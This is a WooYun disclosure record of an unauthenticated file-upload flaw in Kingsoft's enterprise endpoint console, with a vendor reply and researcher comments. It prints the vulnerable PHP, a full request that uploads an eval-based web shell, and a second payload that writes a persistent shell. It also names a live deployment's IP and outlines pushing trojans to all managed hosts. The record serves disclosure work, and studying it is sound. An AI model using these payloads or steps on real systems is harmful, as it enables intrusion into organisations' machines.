{"id": 46085, "wybug_id": "wooyun-2014-086015", "wybug_title": "金山企业终端防护优化系统Web控制台无需登录任意文件上传(怀疑后门)", "wybug_corp": "金山毒霸", "wybug_author": "xfkxfk", "wybug_date": "2014-12-05 18:42", "wybug_open_date": "2015-03-05 18:44", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-02-01：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-11：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-02-21：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-05：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： 金山企业终端防护优化系统Web控制台无需登录任意文件上传，怀疑是自己留的后门？而且此系统运行的都是system权限，没有然后了！最新版：2014-12-04的版本测试 详细说明：  今天看到这个漏洞：http://wooyun.org/bugs/wooyun-2014-085148但是未公开，看不到内容然后再官网下了一个最新版的：2014-12-04，昨天才更新的安装后发现存在/tools/manage/upload.php文件\n<?php// In PHP versions earlier than 4.1.0, $HTTP_POST_FILES should be used instead// of $_FILES.$uploaddir = '..//..//UploadDir//';if(file_exists('../../../server.conf') != false){\t$settings = parse_ini_file('../../../server.conf', true);\t$uploaddirex =  $settings['UploadSet']['CltUploadUrl'];\tif($uploaddirex)\t{\t\t$uploaddir = $uploaddirex;\t}}else{\t//写入配置文件}mkdir($uploaddir,0777, true);$uploadfile = $uploaddir . basename($_FILES['file']['name']);echo '<pre>';if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)) {    echo \"File is valid, and was successfully uploaded.\\n\";} else {    echo \"Possible file upload attack!\\n\";}echo 'Here is some more debugging info:';print_r($_FILES);print \"</pre>\";?>\n看看代码得知，这里没有权限验证，而且直接上传文件到根目录下的UploadDir目录文件类型没有任何限制，直接上传php文件：\nPOST /tools/manage/upload.php HTTP/1.1Host: 127.0.0.1:6868Connection: keep-aliveContent-Length: 220Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://127.0.0.1:6868User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36Content-Type: multipart/form-data; boundary=----WebKitFormBoundarym9ssJ6F9ti74PdBEAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4,ja;q=0.2------WebKitFormBoundarym9ssJ6F9ti74PdBEContent-Disposition: form-data; name=\"file\"; filename=\"222222.php\"Content-Type: image/jpeg<?php@eval($_POST[cmd]);phpinfo();?>------WebKitFormBoundarym9ssJ6F9ti74PdBE\n\n\n成功上传文件。文件地址：\nhttp://127.0.0.1:6868/UploadDir/222222.php\n但是这里上传文件在过几秒之后，会自动删除，大概在2-3秒左右那么我们换一个文件内容，让他在短时间内写一个文件到其他目录。shell文件内容如下：\n<?phpfputs(fopen('../tools/shell.php','w'),'<?php @eval($_POST[cmd]);phpinfo();?>');?>\n然后接着访问：\nhttp://127.0.0.1:6868/UploadDir/222222.php\n最后会在/tools/目录下生成shell.php，最后shell地址：\nhttp://127.0.0.1:6868/tools/shell.php\n这样就简单 的拿到web控制台的shell了。此文件没有任何用处，就是一个单独的文件上传。其他文件也不见引用。而且在找到的案例中，大部分都更新到最新版了12-04了因为这个系统在安装时会安装自动更新但是这个文件却没有变，看时间还是很久以前的难道这不是后门么？下面我们讲讲危害：这个web控制台管理者企业内的全部主机：我们找一个案例：\nhttp://60.190.151.150\n\n\n此Web控制台中管理者20台主机，看起来好像是lenovo的主机。如果我们拿下这一台主机，其他主机都可以那此主机来管理很简单：1、在推荐工具处上传木马2、在部署中心，发布推荐同志消息3、让控制主机下载安装4、这样即可自动拿到全部主机还有就是此系统是运行在system权限下的，所以通过拿到shell即可拿到主机我们找几个案例看看：\n\n其他几个案例也是system权限，不一一列举了   漏洞证明：  \n\n   修复方案：  这个文件没啥用，删了吧   版权声明：转载请注明来源 xfkxfk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-12-08 11:23 厂商回复： 感谢您的提交，我们已经修复该问题 最新状态： 2015-01-13：漏洞已修复  ", "replys": "漏洞评价：\n评论\n     2014-12-05 21:59 |    \t\tg0odnight \t\t\t( 实习白帽子  |\t\t\t        Rank:83 漏洞数:13        | 么么哒，呵呵哒，么蛤蛤~)\t\t \n  无影响厂商忽略    \n     2014-12-05 23:12 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1232 漏洞数:165        | 。)\t\t \n  @黑名单  不会和你的一样吧？    \n     2014-12-05 23:21 |    \t\txfkxfk  \t\t\t( 核心白帽子 |\t\t\t        Rank:2179 漏洞数:330        | 呵呵！)\t\t \n  @scanf @g0odnight @黑名单 金山毒霸昨天出来升级包，改动了一个save_tools.php的文件，不知道是不是修复的@黑名单 的那个漏洞    \n     2014-12-05 23:37 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1232 漏洞数:165        | 。)\t\t \n  话说我发现了，准备提交到裤带的然后看到黑名单提交了也就没有提交了 。    \n     2014-12-05 23:47 |    \t\txfkxfk  \t\t\t( 核心白帽子 |\t\t\t        Rank:2179 漏洞数:330        | 呵呵！)\t\t \n  @scanf 嗯，那就确定最新版已经修复上个漏洞，这是在其他地方，就跟后门一样存在    \n     2014-12-06 00:33 |    \t\t黑名单 \t\t\t( 实习白帽子  |\t\t\t        Rank:60 漏洞数:13        | 像个傻瓜似的，为什么。)\t\t \n  0.0 不知道 我的居然被忽略了 特码的 偷偷修复了 擦 这厂商 真 恶  心    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}